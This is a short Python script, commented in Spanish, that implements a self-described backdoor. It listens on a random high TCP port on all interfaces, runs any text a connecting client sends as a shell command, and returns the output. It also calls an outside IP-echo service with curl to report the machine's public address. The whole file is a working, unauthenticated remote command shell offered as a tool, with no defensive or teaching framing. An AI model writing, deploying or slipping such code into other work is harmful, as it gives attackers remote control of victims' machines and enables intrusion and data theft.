import socket
import subprocess
import random
from time import sleep

# Definir el rango de puertos
min_port = 49152
max_port = 65535


# Asignar un puerto aleatorio dentro del rango especificado
def get_random_port():
    return random.randint(min_port, max_port)


def get_public_ip():
    import re

    ip = (
        subprocess.check_output("curl -s4 ipecho.net/plain", shell=True)
        .decode()
        .strip()
    )
    return re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip).group()


def execute_command(command):
    return subprocess.check_output(command, shell=True)


def backdoor(public_ip="0.0.0.0"):
    global client_socket
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            port = get_random_port()
            server.bind((public_ip, port))
            server.listen(1)
            print(f"Backdoor listening on {public_ip}:{port}...")
            client_socket, addr = server.accept()
            print(f"Connection from {addr}")
            print("Type 'exit' to exit the backdoor.")
            while True:
                command = client_socket.recv(1024).decode()
                if command.lower() == "exit":
                    client_socket.close()
                    print("bye!")
                    break
                else:
                    output = execute_command(command)
                    client_socket.send(output)
        except Exception as e:
            print(f"Error {e}")
            client_socket.close()


if __name__ == "__main__":
    public_ip = "0.0.0.0"
    print(f"public ip looks like {get_public_ip()}\n")
    backdoor(public_ip)
